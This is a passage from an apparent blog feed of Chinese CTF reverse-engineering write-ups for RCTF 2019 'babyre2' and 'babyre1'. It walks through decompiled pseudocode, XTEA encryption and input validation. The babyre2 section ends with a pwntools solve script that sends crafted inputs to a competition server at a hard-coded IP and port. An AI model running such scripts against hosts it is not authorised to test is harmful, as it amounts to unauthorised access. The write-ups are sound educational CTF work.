<span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &lt;= <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;dest, (<span class="keyword">const</span> <span class="keyword">void</span> *)a1, (<span class="keyword">signed</span> <span class="keyword">int</span>)v5);<span class="comment">// 复制内存</span></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; <span class="number">16</span> - (<span class="keyword">signed</span> <span class="keyword">int</span>)v5 &gt; i; ++i )</span><br><span class="line">      *((_BYTE *)&amp;dest + i + (<span class="keyword">signed</span> <span class="keyword">int</span>)v5) = i + <span class="number">1</span>;<span class="comment">// 对于没有满16位的account 自动补全16位(补全一个从0开始的递增序列)</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = *(_QWORD *)(a1 + <span class="number">8</span>);</span><br><span class="line">    dest = *(_QWORD *)a1;</span><br><span class="line">    v7 = v2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> sub_55761565981E(&amp;v8, <span class="number">17</span>, (__int64)&amp;dest, <span class="number">16</span>, (<span class="keyword">int</span> *)a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *__<span class="function">fastcall <span class="title">sub_55761565981E</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *buf, <span class="keyword">int</span> a2, __int64 a1, <span class="keyword">int</span> a4, <span class="keyword">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v6; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  __int64 acc; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+24h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  acc = a1;</span><br><span class="line">  v6 = a5;</span><br><span class="line">  dest = <span class="number">0L</span>L;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( buf )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a1 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a4 == <span class="number">16</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a5 )</span><br><span class="line">          &#123;</span><br><span class="line">            *a5 = <span class="number">0</span>;</span><br><span class="line">            v9 = <span class="number">4</span> * (a2 / <span class="number">4</span> + <span class="number">1</span>);</span><br><span class="line">            dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(v9 + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> ( dest )</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="built_in">memcpy</span>(dest, buf, a2);</span><br><span class="line">              <span class="built_in">memset</span>(&amp;dest[a2], <span class="number">4</span> - a2 % <span class="number">4</span>, <span class="number">4</span> - a2 % <span class="number">4</span>);<span class="comment">// 填充了3</span></span><br><span class="line">              dest[v9] = <span class="number">0</span>;</span><br><span class="line">              xtea((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)dest, v9 / <span class="number">4</span>, acc);<span class="comment">// 这里是执行了加密的过程,account作为密钥</span></span><br><span class="line">              *v6 = v9;</span><br><span class="line">              v8 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dest )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(dest);</span><br><span class="line">      dest = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      *v6 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简单来说就是利用xtea算法，将buf（上面的数组）加密了，密钥是账户名</p><h3 id="sub-557615658C02"><a href="#sub-557615658C02" class="headerlink" title="sub_557615658C02"></a>sub_557615658C02</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_557615658C02</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+14h] [rbp-81Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+18h] [rbp-818h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// [rsp+18h] [rbp-818h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-814h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">2048</span>]; <span class="comment">// [rsp+20h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+820h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+828h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  print_notice();</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x400</span>uLL);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &amp; <span class="number">1</span> || v3 &gt; <span class="number">1024</span> )                    <span class="comment">// 长度不超过1024,且必须为偶数</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    print_notice();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3; ++i )                  <span class="comment">// 检测输入是否合规</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( (buf[i] &lt;= <span class="number">47</span> || buf[i] &gt; <span class="number">57</span>) &amp;&amp; (buf[i] &lt;= <span class="number">96</span> || buf[i] &gt; <span class="number">102</span>) &amp;&amp; (buf[i] &lt;= <span class="number">64</span> || buf[i] &gt; <span class="number">70</span>) )<span class="comment">// 只准输入数字，大小写的字母a~f</span></span><br><span class="line">      &#123;</span><br><span class="line">        print_notice();</span><br><span class="line">        v2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v2 )                                   <span class="comment">// 如果输入合规</span></span><br><span class="line">      v4 = sub_5576156587C6(buf, v3, (_QWORD *)a1);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v4 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读入了偶数个字节的数据，并且长度不超过1024，数据只能在0<del>9 a</del>f A~F的范围</p><h3 id="sub-557615658DD6"><a href="#sub-557615658DD6" class="headerlink" title="sub_557615658DD6"></a>sub_557615658DD6</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">_BYTE *__<span class="function">fastcall <span class="title">sub_557615658DD6</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *passwd, __int64 data, <span class="keyword">int</span> chunk, _DWORD *a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v5; <span class="comment">// [rsp+0h] [rbp-50h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v7; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v8; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+34h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+3Ch] [rbp-14h]</span></span><br><span class="line">  _BYTE *ptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = chunk;</span><br><span class="line">  v5 = a4;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  ptr = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( data )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( chunk &gt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( passwd )</span><br><span class="line">      &#123;</span><br><span class="line">        v10 = <span class="built_in">strlen</span>(passwd);</span><br><span class="line">        <span class="keyword">if</span> ( v10 &gt; <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ptr = <span class="built_in">malloc</span>(v10 + <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">if</span> ( ptr )</span><br><span class="line">          &#123;</span><br><span class="line">            ptr[v10] = <span class="number">0</span>;</span><br><span class="line">            v8 = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v10; ++i )</span><br><span class="line">            &#123;</span><br><span class="line">              v11 = passwd[i] - (passwd[i] % <span class="number">10</span> + passwd[i] / <span class="number">10</span>);<span class="comment">// 由passwd生成了一个偏移地址</span></span><br><span class="line">              <span class="keyword">if</span> ( v11 &gt;= v6 )</span><br><span class="line">              &#123;</span><br><span class="line">                v8 = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              ptr[i] = *(_BYTE *)(v11 + data);  <span class="comment">// ptr[i]就等于这个偏移地址上面的数据</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v8 )                           <span class="comment">// 若正常退出</span></span><br><span class="line">            &#123;</span><br><span class="line">              *v5 = v10;</span><br><span class="line">              v7 = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 &amp;&amp; ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    ptr = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用passwd可以算出来一个偏移，对应着data中的数据，生成了一个ptr数组</p><h3 id="sub-557615658FB0"><a href="#sub-557615658FB0" class="headerlink" title="sub_557615658FB0"></a>sub_557615658FB0</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; passwd_len; ++j )</span><br><span class="line">    *((_BYTE *)&amp;dest + j) ^= <span class="number">0xCC</span>u;             <span class="comment">// ptr进行异或0xcc</span></span><br><span class="line">  ::ptr = sub_5576156599B9(v6, v7, (__int64)&amp;dest, <span class="number">16</span>, &amp;dword_55761585B058);</span><br></pre></td></tr></table></figure><p>sub_5576156599B9:</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">xtea((<span class="keyword">unsigned</span> <span class="keyword">int</span> *)dest, buf_len / <span class="number">-4</span>, v7);<span class="comment">// 这里执行解密的过程，解密encrypted，密钥为ptr_xor</span></span><br></pre></td></tr></table></figure><h3 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h3><blockquote><p> xtea(xtea(buf, accout, ENCRYPT) ,f(data,passwd) , DECRYPT)</p></blockquote><blockquote><p>f(data, passwd) == accout</p></blockquote><p>passwd到data是一个很简单的映射，映射完之后要异或一个0xcc，异或结果应该刚好等于account</p><h2 id="solve"><a href="#solve" class="headerlink" title="solve"></a>solve</h2><p>script from dalao</p><p><a href="https://balsn.tw/ctf_writeup/20190518-rctf2019/#babyre2" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20190518-rctf2019/#babyre2</a></p><p>我自己还没用过pwntools。。。没想到要直接给程序传入非可见字符，所以就借用了一下国外大佬的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">"139.180.215.222"</span>, <span class="number">20000</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"account"</span>)</span><br><span class="line">r.send(<span class="string">"a"</span>*<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">"password"</span>)</span><br><span class="line">r.send(<span class="string">"\x10"</span>*<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">"data"</span>)</span><br><span class="line">r.send(<span class="string">"010203040506070809ad0b0c0d0e0f"</span>) <span class="comment">#ad=61^cc</span></span><br><span class="line">r.shutdown(<span class="string">"send"</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="write-up" scheme="https://mrh1s.top/categories/write-up/"/>
    
      <category term="rctf-20190518" scheme="https://mrh1s.top/categories/write-up/rctf-20190518/"/>
    
    
      <category term="RE_Static" scheme="https://mrh1s.top/tags/RE-Static/"/>
    
      <category term="xtea" scheme="https://mrh1s.top/tags/xtea/"/>
    
      <category term="pwntools" scheme="https://mrh1s.top/tags/pwntools/"/>
    
  </entry>
  
  <entry>
    <title>rctf_babyre1</title>
    <link href="https://mrh1s.top/posts/122a7c75/"/>
    <id>https://mrh1s.top/posts/122a7c75/</id>
    <published>2019-05-20T16:49:39.000Z</published>
    <updated>2019-05-21T12:51:31.761Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="RCTF-babyre1"><a href="#RCTF-babyre1" class="headerlink" title="RCTF_babyre1"></a>RCTF_babyre1</h1><p><a href="\uploads\rctf_babyre1.7z">rctf_babyre1</a></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>以下是与输入相关的指令</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 *in; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v9; <span class="comment">// rbx</span></span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+4h] [rbp-124h]</span></span><br><span class="line">  <span class="keyword">void</span> *ptr; <span class="comment">// [rsp+8h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 str; <span class="comment">// [rsp+10h] [rbp-118h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// [rsp+118h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  ptr = <span class="number">0L</span>L;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;str, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  __printf_chk(<span class="number">1L</span>L, <span class="string">"Input right flag you can got 'Bingo!' :"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%31s"</span>, &amp;str);                 <span class="comment">// 输入为16位</span></span><br><span class="line">  in = &amp;str;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_DWORD *)in;</span><br><span class="line">    in = (<span class="keyword">unsigned</span> __int64 *)((<span class="keyword">char</span> *)in + <span class="number">4</span>);</span><br><span class="line">    v5 = ~v4 &amp; (v4 - <span class="number">0x1010101</span>) &amp; <span class="number">0x80808080</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( !v5 );</span><br><span class="line">  <span class="keyword">if</span> ( !((<span class="keyword">unsigned</span> __int16)~(_WORD)v4 &amp; (<span class="keyword">unsigned</span> __int16)(v4 - <span class="number">0x101</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">    v5 &gt;&gt;= <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !((<span class="keyword">unsigned</span> __int16)~(_WORD)v4 &amp; (<span class="keyword">unsigned</span> __int16)(v4 - <span class="number">0x101</span>) &amp; <span class="number">0x8080</span>) )</span><br><span class="line">    in = (<span class="keyword">unsigned</span> __int64 *)((<span class="keyword">char</span> *)in + <span class="number">2</span>);</span><br><span class="line">  v6 = (<span class="keyword">char</span> *)in - __CFADD__((_BYTE)v5, (_BYTE)v5) - <span class="number">3</span> - (<span class="keyword">char</span> *)&amp;str;</span><br><span class="line">  <span class="keyword">if</span> ( v6 &gt; <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input is too long!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( v6 == <span class="number">16</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = change_into_number((<span class="keyword">unsigned</span> __int64)&amp;str, <span class="number">16</span>, &amp;ptr);<span class="comment">// 这个程序就是把输入的内容（十六进制）转换成了程序可读的数字</span></span><br><span class="line">    <span class="keyword">if</span> ( v7</span><br><span class="line">      &amp;&amp; (v8 = xtea_keychanged(ptr, v7, (__int64)&amp;unk_55883B7B0010, <span class="number">16</span>, &amp;v12), (v9 = (<span class="keyword">char</span> *)v8) != <span class="number">0L</span>L)</span><br><span class="line">      &amp;&amp; v12 &gt; <span class="number">0</span></span><br><span class="line">      &amp;&amp; (<span class="keyword">unsigned</span> __int16)crc16((__int64)v8, v12) == <span class="number">0x69E2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0L</span>L; v12 &gt; (<span class="keyword">signed</span> <span class="keyword">int</span>)i; ++i )</span><br><span class="line">        v9[i] ^= <span class="number">0x17</span>u;</span><br><span class="line">      <span class="built_in">puts</span>(v9);</span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">      <span class="built_in">free</span>(v9);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"input flag is wrong!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"input is too short!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到输入后的字符串进行了一大堆看不懂的操作，但是能推测出来输入的长度为16位</p><p>用ida调试可知，change_into_number这个函数把输入的字符串进行了转换</p><p>完成了16进制字符串 -&gt; 16进制整数的过程</p><h3 id="xtea-keychanged中的一个子函数"><a href="#xtea-keychanged中的一个子函数" class="headerlink" title="xtea_keychanged中的一个子函数"></a>xtea_keychanged中的一个子函数</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_55883B5AECE0</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v9; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v10; <span class="comment">// er15</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v11; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v12; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">int</span> *v13; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> v14; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v17; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v18; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> *v19; <span class="comment">// r10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v20; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v21; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v22; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v24; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v25; <span class="comment">// er11</span></span><br><span class="line">  <span class="keyword">int</span> *v26; <span class="comment">// r13</span></span><br><span class="line">  <span class="keyword">int</span> v27; <span class="comment">// er14</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v28; <span class="comment">// er12</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v29; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> *v30; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">int</span> v31; <span class="comment">// esi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v32; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v33; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v34; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v35; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v36; <span class="comment">// dl</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v37; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> v38; <span class="comment">// er15</span></span><br><span class="line">  <span class="keyword">int</span> *v39; <span class="comment">// r8</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v40; <span class="comment">// er10</span></span><br><span class="line">  <span class="keyword">int</span> v41; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v42; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v43; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> *v44; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v45; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  v4 = a2;</span><br><span class="line">  v5 = *a1;</span><br><span class="line">  v43 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = a2 - <span class="number">1</span>;</span><br><span class="line">    v7 = &amp;a1[a2 - <span class="number">1</span>];</span><br><span class="line">    v8 = <span class="number">0</span>;</span><br><span class="line">    v9 = *v7;</span><br><span class="line">    v10 = ((a2 - <span class="number">4</span>) &amp; <span class="number">0xFFFFFFFE</span>) + <span class="number">2</span>;</span><br><span class="line">    v45 = <span class="number">0x9E3779B9</span> * (<span class="number">52</span> / a2) - <span class="number">0x4AB325AA</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v8 -= <span class="number">0x61C88647</span>;</span><br><span class="line">      v11 = v8 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v43 &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v14 = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v12 = *a1;</span><br><span class="line">        v13 = a1;</span><br><span class="line">        v14 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v15 = v13[<span class="number">1</span>];</span><br><span class="line">          v13 += <span class="number">2</span>;</span><br><span class="line">          v16 = (v9 ^ *(_DWORD *)(v3 + <span class="number">4L</span>L * (((<span class="keyword">unsigned</span> __int8)v14 ^ (<span class="keyword">unsigned</span> __int8)v11) &amp; <span class="number">3</span>))) + (v15 ^ v8);</span><br><span class="line">          v17 = v14 + <span class="number">1</span>;</span><br><span class="line">          v14 += <span class="number">2</span>;</span><br><span class="line">          v18 = v12 + ((((v9 &gt;&gt; <span class="number">5</span>) ^ <span class="number">4</span> * v15) + ((v15 &gt;&gt; <span class="number">3</span>) ^ <span class="number">16</span> * v9)) ^ v16);</span><br><span class="line">          v12 = *v13;</span><br><span class="line">          *(v13 - <span class="number">2</span>) = v18;</span><br><span class="line">          v9 = v15</span><br><span class="line">             + (((<span class="number">4</span> * v12 ^ (v18 &gt;&gt; <span class="number">5</span>)) + (<span class="number">16</span> * v18 ^ (v12 &gt;&gt; <span class="number">3</span>))) ^ ((v12 ^ v8)</span><br><span class="line">                                                                    + (v18 ^ *(_DWORD *)(v3</span><br><span class="line">                                                                                       + <span class="number">4L</span>L</span><br><span class="line">                                                                                       * (((<span class="keyword">unsigned</span> __int8)v11 ^ v17) &amp; <span class="number">3</span>)))));</span><br><span class="line">          *(v13 - <span class="number">1</span>) = v9;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v10 != v14 );</span><br><span class="line">      &#125;</span><br><span class="line">      v19 = &amp;a1[v14];</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        v20 = v19[<span class="number">1</span>];</span><br><span class="line">        v21 = v11 ^ v14++;</span><br><span class="line">        ++v19;</span><br><span class="line">        v22 = *(v19 - <span class="number">1</span>)</span><br><span class="line">            + (((v9 ^ *(_DWORD *)(v3 + <span class="number">4L</span>L * (v21 &amp; <span class="number">3</span>))) + (v20 ^ v8)) ^ ((<span class="number">16</span> * v9 ^ (v20 &gt;&gt; <span class="number">3</span>)) + ((v9 &gt;&gt; <span class="number">5</span>) ^ <span class="number">4</span> * v20)));</span><br><span class="line">        *(v19 - <span 